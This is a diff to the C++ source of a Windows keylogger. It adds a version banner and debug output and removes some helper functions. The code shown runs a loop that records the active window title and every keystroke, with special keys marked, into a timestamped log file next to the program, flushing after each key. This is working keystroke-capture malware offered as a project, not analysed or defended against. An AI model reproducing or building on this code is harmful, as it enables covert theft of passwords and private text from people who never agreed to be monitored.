@@ -1,6 +1,6 @@
 
 /*
-	Keylogger/1.0.0
+	Keylogger
 	Created @ 02.02.2009
 	Copyright (C) 2009 Christian Mayer <http://fox21.at>
 	
@@ -24,6 +24,10 @@
 using namespace std;
 
 int main(int argc, char *argv[]){
+	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
+	puts(PROJECT_COPYRIGHT);
+	puts("");
+	
 	
 	string basepath = dirBasename(getSelfPath());
 	
@@ -36,12 +40,13 @@ int main(int argc, char *argv[]){
 	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
 	sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
 	
-	//cout << filepath << endl; exit(0);
+	//printf("filepath '%s'\n", filepath); exit(0);
+	
 	
 	string lastTitle = "";
 	ofstream klogout(filepath);
 	
-	SHORT lastc = 0;
+	//SHORT lastc = 0;
 	while(1){
 		Sleep(2); // give other programs time to run
 		
@@ -51,12 +56,25 @@ int main(int argc, char *argv[]){
 		GetWindowText(hwndHandle, title, 1023);
 		if(lastTitle != title){
 			klogout << endl << endl << "Window: ";
-			if(strlen(title) == 0)
+#ifdef DEBUG
+			cout << endl << endl << "Window: ";
+#endif
+			if(strlen(title) == 0){
 				klogout << "NO ACTIVE WINDOW";
-			else
+#ifdef DEBUG
+				cout << "NO ACTIVE WINDOW";
+#endif
+			}
+			else{
 				klogout << "'" << title << "'";
-			
+#ifdef DEBUG
+				cout << "'" << title << "'";
+#endif
+			}
 			klogout << endl;
+#ifdef DEBUG
+			cout << endl;
+#endif
 			
 			lastTitle = title;
 		}
@@ -110,7 +128,9 @@ int main(int argc, char *argv[]){
 					out = "[INS]";
 				else if(c == 46)
 					out = "[DEL]";
-				else if(c >= 65 && c <= 90 || c >= 48 && c <= 57 || c == 32)
+				else if((c >= 65 && c <= 90)
+					|| (c >= 48 && c <= 57)
+					|| c == 32)
 					out = c;
 				
 				else if(c == 91 || c == 92)
@@ -151,60 +171,19 @@ int main(int argc, char *argv[]){
 				else
 					out = "[KEY \\" + intToString(c) + "]";
 				
-				//cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
+#ifdef DEBUG
+				cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
+#endif
 				klogout << out;
 				klogout.flush();
 				
-				lastc = c;
+				//lastc = c;
 			}
 		}
+		
 	}
 	
 	klogout.close();
 	
 	return 0;
-}
-
-string intToString(int i){
-	stringstream out;
-	out << "" << i;
-	return out.str();	
-}
-
-string getCurrDir(){
-	string rv = "";
-	
-	char *curdir = new char[MAX_PATH];
-	GetCurrentDirectory(MAX_PATH, curdir);
-	rv = curdir;
-	delete[] curdir;
-	
-	return rv;
-}
-
-string getSelfPath(){
-	char selfpath[MAX_PATH];
-	GetModuleFileName(NULL, selfpath, MAX_PATH);
-	return selfpath;
-}
-
-string dirBasename(string path){
-	
-	if(path.empty())
-		return "";
-	
-	if(path.find("\\") == string::npos)
-		return path;
-	
-	if(path.substr(path.length() - 1) == "\\")
-		path = path.substr(0, path.length() - 1);
-	
-	size_t pos = path.find_last_of("\\");
-	if(pos != string::npos)
-		path = path.substr(0, pos);
-	
-	if(path.substr(path.length() - 1) == "\\")
-		path = path.substr(0, path.length() - 1);
-	
-	return path;
 }
